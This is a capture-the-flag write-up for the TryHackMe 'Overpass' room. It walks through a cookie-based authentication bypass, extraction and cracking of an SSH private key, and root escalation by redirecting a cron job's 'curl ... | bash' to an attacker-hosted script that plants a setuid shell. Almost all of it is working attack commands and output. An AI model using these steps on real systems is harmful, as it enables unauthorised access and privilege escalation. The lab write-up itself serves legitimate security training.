| Category          | Details                                         |
|-------------------|-------------------------------------------------|
| 📝 **Name**       | [Overpass](https://tryhackme.com/room/overpass) |  
| 🏷 **Type**       | THM Challenge                                   |
| 🖥 **OS**         | Linux                                           |
| 🎯 **Difficulty** | Easy                                            |
| 📁 **Tags**       | Authentication bypass, ssh2john, crontab        |

## Task 1: Overpass

### Hack the machine and get the flag in user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 21:20 CET
Nmap scan report for 10.80.154.192
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 26:9e:e1:89:c5:52:f3:6f:86:0a:d2:be:3d:7e:df:52 (RSA)
|   256 05:74:19:72:51:33:91:c3:9e:ab:ca:cf:2a:16:3e:a9 (ECDSA)
|_  256 3f:65:ca:e5:8c:3f:08:ba:2f:43:d2:6b:02:41:26:09 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.54 seconds
```

#### Enumerate web application to discover `/admin` URL
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt                                                 
<SNIP>
301      GET        2l        3w       42c http://10.81.190.27/admin => http://10.81.190.27/admin/
<SNIP>
```

#### Analyze client side login JS code
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ curl -s http://$TARGET/login.js | cat -n
    35      const statusOrCookie = await response.text()
    36      if (statusOrCookie === "Incorrect credentials") {
    37          loginStatus.textContent = "Incorrect Credentials"
    38          passwordBox.value=""
    39      } else {
    40          Cookies.set("SessionToken",statusOrCookie)
    41          window.location = "/admin"
    42      }
    43  }
```
We could see that after successful authentication `SessionToken` cookie is set to value returned by the backend server and user is being redirected to `/admin`. We could check if the value of this cookie is actually verified after login by setting it to some random value.

#### Bypass authentication by setting `SessionToken` cookie to random value
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ curl -s http://$TARGET/admin/ -H "Cookie: SessionToken=$RANDOM" 
<SNIP>
            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
<SNIP>
```
We can see that were able to bypass authentication and have discovered encrypted SSH private key for user `james`.

#### Exfiltrate SSH private key and break its encryption
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ curl -s http://$TARGET/admin/ -H "Cookie: SessionToken=$RANDOM" | sed -n '/<pre[^>]*>/,/<\/pre>/{                                   
  s/<pre[^>]*>//g
  s/<\/pre>//g
  s/^[[:space:]]*//
  p
}' > id_rsa && chmod 600 id_rsa && \
ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2025-12-19 15:05) 6.666g/s 89173p/s 89173c/s 89173C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Use decrypted SSH private key to gain initial foothold
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ ssh -i id_rsa james@$TARGET
Enter passphrase for key 'id_rsa': 
<SNIP>
james@ip-10-81-190-27:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

#### Capture 1s flag
```
james@ip-10-81-190-27:~$ cat /home/james/user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```

### Escalate your privileges and get the flag in root.txt

#### Discover `buildscript.sh` being executed every minute as `root` user
```
james@ip-10-81-190-27:~$ cat /etc/crontab
<SNIP>>
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
If we could re-route network traffic for `overpass.thm` to our machine we could return malicious version of `buildscript.sh`.

#### Check write permissions to `/etc/hosts`
```
james@ip-10-81-190-27:~$ cat /etc/hosts && ls -l /etc/hosts && lsattr /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
--------------e----- /etc/hosts
```
With write permissions to `/etc/hosts` we could change `127.0.0.1 overpass.thm` with attacker machine IP address.

#### Host root shell spawning version of `buildscript.sh`
```
┌──(magicrc㉿perun)-[~/attack/THM Overpass]
└─$ mkdir -p downloads/src/ && \
echo "/bin/cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell" > downloads/src/buildscript.sh && \
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Replace `127.0.0.1 overpass.thm` with `192.168.132.170 overpass.thm` in `/etc/hosts`
```
james@ip-10-81-190-27:~$ ed /etc/hosts <<'EOF'
g/^127\.0\.0\.1[[:space:]]\+overpass\.thm$/s//192.168.132.170 overpass.thm/
w
q
EOF
250
256
```

#### Wait for `/tmp/root_shell` to spawn and use it to escalate privileges
```
james@ip-10-81-190-27:~$ /tmp/root_shell -p
root_shell-5.0# id
uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
```

#### Capture 2nd flag
```
root_shell-5.0# cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```